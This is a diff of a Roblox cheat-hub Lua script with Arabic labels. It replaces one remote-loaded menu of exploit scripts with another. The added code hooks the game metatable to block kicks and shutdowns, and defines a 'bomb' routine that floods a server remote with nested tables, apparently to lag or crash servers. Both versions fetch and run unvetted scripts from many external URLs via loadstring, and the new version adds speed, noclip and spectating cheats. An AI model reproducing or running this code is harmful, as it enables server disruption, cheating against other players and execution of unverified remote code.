@@ -1,328 +1,496 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/main/UI-Libraries/Visual%20Command%20UI%20Library/Source.lua', true))()
 
-local Window = Rayfield:CreateWindow({
-   Name = "RobartoxVoiidxLith",
-   Icon = 89329261427843, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
-   LoadingTitle = "LQ BAT",
-   LoadingSubtitle = "Made By BAT!",
-   Theme = "DarkBlue", -- Check https://docs.sirius.menu/rayfield/configuration/themes
-
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
-
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil, -- Create a custom folder for your hub/game
-      FileName = "LQ SCRIPTS"
-   },
-
-   Discord = {
-      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
-      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
-      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
-   },
-
-   KeySystem = false, -- Set this to true to use our key system
-   KeySettings = {
-      Title = "Untitled",
-      Subtitle = "Key System",
-      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
-      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
-   }
+local Window = Library:CreateWindow({
+    Name = 'اهلا بك',
+    IntroText = 'سكربت الانقلاب | Script الانقلاب Hub',
+    IntroIcon = 'rbxassetid://14001480246',
+    IntroBlur = true,
+    IntroBlurIntensity = 15,
+    Theme = Library.Themes.dark,
+    Position = 'bottom',
+    Draggable = true,
+    Prefix = ';'
 })
 
-Rayfield:Notify({
-   Title = "Welcome To My Script!",
-   Content = "This Script Made Specially For You And LQ Clan",
-   Duration = 5,
-   Image = 110139412486838,
+
+Wait(0.5)
+game.StarterGui:SetCore("SendNotification", {
+    Title = "تـم تـفـعـيـل سـكـربـت الانقلاب★";
+    Text = "انـتـظـر قـلـيـلاً"; -- ARAB TEAM
+    Duration = 10;
 })
 
-local Tab = Window:CreateTab("AntiAFK Scripts", 89329261427843) -- Title, Image
 
-local Section = Tab:CreateSection("سكربتات صمله")
+game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayName", "Script الانقلاب Hub | 0.1V")
 
-local Button = Tab:CreateButton({
-   Name = "ANIT AFK LQ OP",
-   Callback = function()
-   wait(0.5)local ba=Instance.new("ScreenGui")
-local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
-local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
-ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
-ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
-ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
-ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti AFK Script"ca.TextColor3=Color3.new(0,1,1)
-ca.TextSize=22;da.Parent=ca
-da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
-da.Size=UDim2.new(0,370,0,107)_b.Parent=da
-_b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
-_b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="made by ur mom "
-_b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
-ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
-ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
-ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
-game:service'Players'.LocalPlayer.Idled:connect(function()
-bb:CaptureController()bb:ClickButton2(Vector2.new())
-ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)
-})
 
-local Button = Tab:CreateButton({
-   Name = "AntiAFK V2",
-   Callback = function()
-   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anti-Afk-Remastered-Script-or-Diffrent-Cool-UI-2097"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "AntiAFK By hassanxzayn",
-   Callback = function()
-   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AntiAFK-script-18076"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "AntiAFK By getmepink",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/brosula123/Anti-afk/main/Bl%C3%B8xzScript"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "AntiAFK KongerHub",
-   Callback = function()
-   loadstring(game:HttpGet("https://zxfolix.github.io/antiafk.lua"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "AntiAFK Advanced With Spam",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
-   end,
-})
-
-local Tab = Window:CreateTab("BrookHaven Scripts", 132680152916449) -- Title, Image
-
-local Section = Tab:CreateSection("سكربتات ماب البيوت")
-
-local Button = Tab:CreateButton({
-   Name = "Infinite Yield",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Nameless Admin Script",
-   Callback = function()
-   --[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Atomic Hub",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/n0kc/AtomicHub/main/Map-Al-Biout.lua"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "R4D Hub",
-   Callback = function()
-   --[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Ghost Hub",
-   Callback = function()
-   --[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Rochips Universal",
-   Callback = function()
-   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-rochips-universal-18294"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "F0rtuit0us Hub (OP)",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/TrollGuiMaker/f0rtuit0us-hub/refs/heads/main/old"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Sander X NEW UPDATE",
-   Callback = function()
-   loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Sander-x-22769"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "YIN Hub",
-   Callback = function()
-   loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Yin-Hub-21835"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Vex Hub",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/discord.com/invite/3NN5zTW7h2"))()
-   end,
-})
-
-local Tab = Window:CreateTab("Random Scripts", 80203996981387) -- Title, Image
-
-local Section = Tab:CreateSection("سكربتات منوعه *ممكن تشتغل فماب البيوت*")
-
-local Button = Tab:CreateButton({
-   Name = "VR7 تحديث الجديد سكربت تاج معرب",
-   Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()
-  end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Invisible 1 اختفاء",
-   Callback = function()
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Invisible%20Gui'))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Invisible 2 اختفاء",
-   Callback = function()
-   loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Fling Script 1",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Fling Script 2",
-   Callback = function()
-   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fling-gui-script-13229"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "Notify If Someone Leave - Joins",
-   Callback = function()
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))()
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "FPS Booster",
-   Callback = function()
-   --[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-_G.Ignore = {}
-_G.Settings = {
-	Players = {
-		["Ignore Me"] = true,
-		["Ignore Others"] = true,
-		["Ignore Tools"] = true
-	},
-	Meshes = {
-		NoMesh = false,
-		NoTexture = false,
-		Destroy = false
-	},
-	Images = {
-		Invisible = true,
-		Destroy = false
-	},
-	Explosions = {
-		Smaller = true,
-		Invisible = false, -- Not for PVP games
-		Destroy = false -- Not for PVP games
-	},
-	Particles = {
-		Invisible = true,
-		Destroy = false
-	},
-	TextLabels = {
-		LowerQuality = true,
-		Invisible = false,
-		Destroy = false
-	},
-	MeshParts = {
-		LowerQuality = true,
-		Invisible = false,
-		NoTexture = false,
-		NoMesh = false,
-		Destroy = false
-	},
-	Other = {
-		["FPS Cap"] = 360, -- true to uncap
-		["No Camera Effects"] = true,
-		["No Clothes"] = true,
-		["Low Water Graphics"] = true,
-		["No Shadows"] = true,
-		["Low Rendering"] = true,
-		["Low Quality Parts"] = true,
-		["Low Quality Models"] = true,
-		["Reset Materials"] = true,
-	}
+local args = {
+    [1] = "RolePlayBio",
+    [2] = "استمتع"
 }
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
-   end,
+
+game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
+
+local function sendChatMessage(message)
+    if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    elseif game:GetService("TextChatService"):FindFirstChild("TextChannels") then
+        local channel = game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral")
+        if channel then
+            channel:SendAsync(message)
+        end
+    else
+        warn("Chat system not found!")
+    end
+end
+
+local messagestart = ""
+sendChatMessage(messagestart)
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/SYELE0/Color-White/main/And-Black")))()
+
+MakeWindow({
+  Hub = {
+    Title = "الانقلاب | SCRIPT الانقلاب 0.1V",
+    Animation = "الانقلاب 0.1V"
+  },
+  Key = {
+    KeySystem = false,
+    Title = "Key System",
+    Description = "",
+    KeyLink = "",
+    Keys = {"1234"},
+    Notifi = {
+      Notifications = true,
+      CorrectKey = "Running the Script...",
+      Incorrectkey = "The key is incorrect",
+      CopyKeyLink = "Copied to Clipboard"
+    }
+  }
+})
+MinimizeButton({
+  Image = "rbxassetid://14886426786",
+  Size = {50, 50},
+  Color = Color3.fromRGB(10, 10, 10),
+  Corner = true,
+  Stroke = false,
+  StrokeColor = Color3.fromRGB(255, 10, 10)
 })
 
-local Button = Tab:CreateButton({
-   Name = "سكربت FPS",
-   Callback = function()
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/vexroxd/My-Script-/main/roblox%20fps%20unlocker%20script.lua'))()
-   end,
+local Main = MakeTab({Name = "مـعـلـومـات الـمـطـور"})
+local Image = AddImageLabel(Main, {
+  Name = "roberto HU",
+  Image = "rbxassetid://14001480246"
+})
+AddButton(Main, {
+  Name = "اضغط لنسخ حساب تيك توك المطور",
+  Callback = function()
+    setclipboard('where_rasba')
+  end
 })
 
-local Button = Tab:CreateButton({
-   Name = "Fly Gui V3 Modded",
-   Callback = function()
-   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Gui-Modded-10763"))()
-   end,
+AddButton(Main, {
+  Name = "اضغط لنسخ حساب روب المطور",
+  Callback = function()
+    setclipboard('bot rasba')
+       end
+})
+    
+local Main = MakeTab({Name = "طرق "})
+
+AddButton(Main, {
+  Name = "اول سكربت",
+  Callback = function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AntiAFK-v-AntiKick-V3-v-Kick-Attempt-Logger-27977"))()
+    end
 })
 
-local Tab = Window:CreateTab("BONUS", 96509056170213) -- Title, Image
+AddButton(Main, {
+  Name = "طرق1",
+  Callback = function()
+ --[[ 
+  Patch Anti-Shutdown لمدة 9000 ساعة (375 يوم)
+  يعمل في السيرفرات الخاصة فقط
+--]]
 
-local Section = Tab:CreateSection("سكربتات مفيدة")
+if not game.PrivateServerId or game.PrivateServerId == "" then
+    warn("هذا السكربت مخصص للسيرفرات الخاصة فقط.")
+    return
+end
 
-local Button = Tab:CreateButton({
-   Name = "Chat Protection حماية من باند السبام",
-   Callback = function()
-   --[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()
-   end,
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+
+-- حماية من الشات، التغبيش، الرسائل، الكيك
+pcall(function()
+    Lighting.Blur:Destroy()
+end)
+
+game.DescendantAdded:Connect(function(obj)
+    if obj:IsA("BlurEffect") then
+        obj:Destroy()
+    elseif obj:IsA("Message") or obj:IsA("Hint") then
+        obj:Destroy()
+    end
+end)
+
+-- تعطيل الرسائل الوهمية
+StarterGui:SetCore("ResetButtonCallback", false)
+StarterGui:SetCore("DevConsoleVisible", false)
+
+-- منع الكيك أو الشت داون
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+
+local old = mt.__namecall
+
+mt.__namecall = newcclosure(function(self, ...)
+    local args = {...}
+    local method = getnamecallmethod()
+
+    if method == "Kick" or method == "kick" then
+        warn("تم منع محاولة كيك.")
+        return nil
+    end
+
+    if self == game and method == "Shutdown" then
+        warn("تم منع محاولة شت داون.")
+        return nil
+    end
+
+    return old(self, unpack(args))
+end)
+
+-- مؤقت 9000 ساعة (يوقف السكربت بعدها)
+task.spawn(function()
+    local totalTime = 9000 * 3600 -- 9000 ساعة
+    local start = tick()
+
+    while tick() - start < totalTime do
+        task.wait(60) -- انتظار كل دقيقة لتقليل الضغط
+    end
+
+    warn("انتهى وقت الباتش بعد 9000 ساعة، سيتم الإغلاق.")
+    game:Shutdown()
+end)
+
+print("تم تفعيل الباتش بنجاح! سيبقى شغال لمدة 9000 ساعة.")	
+    end
 })
 
-local Button = Tab:CreateButton({
-   Name = "FE Illusion سكربت تفادي بانق",
-   Callback = function()
-   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Illusion-Script-12744"))()
-   end,
+AddButton(Main, {
+  Name = "طرق 2",
+  Callback = function()
+ game:GetService("NetworkClient"):SetOutgoingKBPSLimit(3000) -- تحديد حد أقل للنقل لتقليل الحمل
+
+local function getmaxvalue(val)
+    local mainvalueifonetable = 5000 -- تقليل القيمة الأساسية
+    if type(val) ~= "number" then
+        return nil
+    end
+    local calculateperfectval = (mainvalueifonetable / (val + 2))
+    return calculateperfectval
+end
+
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+
+    table.insert(spammedtable, {})
+    z = spammedtable[1]
+
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+
+    local calculatemax = getmaxvalue(tableincrease)
+    local maximum
+
+    if calculatemax then
+        maximum = calculatemax
+    else
+        maximum = 5000 -- تعديل القيمة القصوى إلى 5000
+    end
+
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+    end
+
+    for i = 1, tries do
+        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+    end
+end
+
+bomb(10, 1) -- تنفيذ العملية مرة واحدة   	
+    end
 })
+
+AddButton(Main, {
+  Name = "عزف حزين",
+  Callback = function()
+
+
+-- دالة لإظهار الإشعار مثل roberto
+local function showNotification()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "roberto"; -- عنوان الإشعار
+        Text = "تم فتح طرق روبييرتو!"; -- نص الإشعار
+        Duration = 5; -- مدة الإشعار (بالثواني)
+    })
+end
+local ScreenGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+local InfoLabel = Instance.new("TextLabel", ScreenGui)
+
+InfoLabel.Size = UDim2.new(0, 200, 0, 50)
+InfoLabel.Position = UDim2.new(0.5, -100, 0, 10)
+InfoLabel.Text = "ROBERtoxCatay - AFK System Active"
+InfoLabel.TextColor3 = Color3.new(1, 1, 1)
+InfoLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+
+if game.Players.LocalPlayer.Character.Humanoid.Health == 100 then
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+else
+print("اقوى طرق")
+end
+local function extremeBoost()
+    -- تعطيل الظلال والإضاءة الثقيلة
+    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+    game:GetService("Lighting").GlobalShadows = false
+    game:GetService("Lighting").FogEnd = 9e9
+    game:GetService("Lighting").Brightness = 3
+
+    -- تعطيل الجسيمات والتأثيرات البصرية
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then
+            v.Enabled = false
+        elseif v:IsA("Explosion") then
+            v.BlastPressure = 0
+            v.BlastRadius = 0
+        end
+    end
+
+    -- تعطيل الأضواء الديناميكية
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("PointLight") or v:IsA("SpotLight") or v:IsA("SurfaceLight") then
+            v.Enabled = false
+        end
+    end
+
+    -- إزالة القوام غير المهمة
+    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
+        if v:IsA("Decal") or v:IsA("Texture") then
+            v:Destroy()
+        end
+    end
+
+    -- تعطيل فيزياء المياه الثقيلة
+    game:GetService("Workspace").Terrain.WaterWaveSize = 0
+    game:GetService("Workspace").Terrain.WaterWaveSpeed = 0
+    game:GetService("Workspace").Terrain.WaterReflectance = 0
+    game:GetService("Workspace").Terrain.WaterTransparency = 1
+
+    -- تعطيل الحركات غير الضرورية في الشخصيات
+    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
+        if v.Character then
+            for _, anim in pairs(v.Character:GetDescendants()) do
+                if anim:IsA("Animation") then
+                    anim:Destroy()
+                end
+            end
+        end
+    end
+
+    -- تعيين الحد الأقصى لمعدل الإطارات
+    setfpscap(70)
+
+local VirtualUser = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:Connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+end)
+
+‏showNotification()
+end
+
+-- تشغيل السكربت
+extremeBoost()
+     end
+})
+
+local Main = MakeTab({Name ="الاوامر"})
+
+AddTextBox(Main, {
+  Name = "الـسـرعـة",
+  Default = "",
+  PlaceholderText = "ادخـل الـرقـم",
+  ClearText = true,
+  Callback = function(value)
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value     
+ end
+})
+AddTextBox(Main, {
+  Name = "الـقـفـز",
+  Default = "",
+  PlaceholderText = "ادخـل الـرقـم",
+  ClearText = true,
+  Callback = function(value)
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = value    
+  end
+})
+AddTextBox(Main, {
+  Name = "الـشـاشـة Fov",
+  Default = "",
+  PlaceholderText = "ادخـل الـرقـم",
+  ClearText = true,
+  Callback = function(value)
+local FovNumber = value
+local Camera = workspace.CurrentCamera
+Camera.FieldOfView = FovNumber  
+  end
+})
+AddTextBox(Main, {
+  Name = "الـدوران spin",
+  Default = "",
+  PlaceholderText = "ادخـل الـرقـم",
+  ClearText = true,
+  Callback = function(Value)
+    getgenv().Spinspeed = Value
+
+local Spin = Instance.new'BodyAngularVelocity'
+Spin.Parent = game:GetService'Players'.LocalPlayer.Character:FindFirstChild'HumanoidRootPart'
+Spin.MaxTorque = Vector3.new(0, math.huge, 100)
+wait(0.1)
+Spin.AngularVelocity = Vector3.new(100,Spinspeed,0)
+  end
+})
+
+function MakeNotifi(notification)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = notification.Title;
+        Text = notification.Text;
+        Duration = notification.Time;
+    })
+end
+
+-- Variáveis e funções para a visualização dos jogadores
+local viewEnabled = false
+local selectedViewPlayer = nil
+local characterAddedConnection = nil
+
+local function toggleView(enabled)
+    if enabled then
+        if selectedViewPlayer then
+            local player = selectedViewPlayer
+            if player then
+                game.Workspace.CurrentCamera.CameraSubject = player.Character
+                if characterAddedConnection then
+                    characterAddedConnection:Disconnect()
+                end
+                characterAddedConnection = player.CharacterAdded:Connect(function(character)
+                    game.Workspace.CurrentCamera.CameraSubject = character
+                end)
+                MakeNotifi({
+                    Title = "Visualizando " .. player.Name,
+                    Text = "Você está visualizando o jogador: " .. player.Name,
+                    Time = 6
+                })
+            else
+                print("Jogador não encontrado.")
+                viewEnabled = false
+            end
+        else
+            print("Nenhum jogador selecionado para a visualização.")
+            viewEnabled = false
+        end
+    else
+        if characterAddedConnection then
+            characterAddedConnection:Disconnect()
+            characterAddedConnection = nil
+        end
+        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+    end
+end
+
+local value = "" -- Variável para armazenar o nome digitado
+
+local function findPlayerByPartialNameOrNickname(partialName)
+    value = partialName -- Atualiza a variável com o nome digitado completo
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player.Name:lower():find(partialName:lower(), 1, true) or (player.DisplayName and player.DisplayName:lower():find(partialName:lower(), 1, true)) then
+            return player
+        end
+    end
+    return nil
+end
+
+
+-- Conectando eventos de jogador removido
+game.Players.PlayerRemoving:Connect(function(player)
+    if selectedViewPlayer == player then
+        selectedViewPlayer = nil
+        if viewEnabled then
+            toggleView(false)
+            MakeNotifi({
+                Title = "Jogador Saiu",
+                Text = player.Name .. " saiu do jogo. Visualização desativada.",
+                Time = 5
+            })
+        end
+    end
+end)
+
+-- Função para manter a câmera no jogador selecionado
+local function maintainView()
+    while wait() do
+        if viewEnabled and selectedViewPlayer then
+            local player = selectedViewPlayer
+            if player and game.Workspace.CurrentCamera.CameraSubject ~= player.Character then
+                game.Workspace.CurrentCamera.CameraSubject = player.Character
+            end
+        end
+    end
+end
+
+
+-- Variável para controlar o estado do Noclip
+local noclipEnabled = false
+local runService = game:GetService("RunService")
+
+-- Função para definir CanCollide para todas as partes do personagem
+local function setCharacterCanCollide(character, canCollide)
+    for _, part in ipairs(character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = canCollide
+        end
+    end
+end
+
+-- Função de callback para o botão de alternância de Noclip
+local function onNoclipToggle(value)
+    noclipEnabled = value
+    print("Noclip Enabled:", noclipEnabled)
+    
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+
+    if noclipEnabled then
+        -- Inicia um loop para continuamente definir CanCollide
+        noclipLoop = runService.Stepped:Connect(function()
+            if character then
+                setCharacterCanCollide(character, false)
+            end
+        end)
+    else
+        -- Desativa o loop e restaura CanCollide
+        if noclipLoop then
+            noclipLoop:Disconnect()
+        end
+        if character then
+            setCharacterCanCollide(character, true)
+        end
+    end
+end
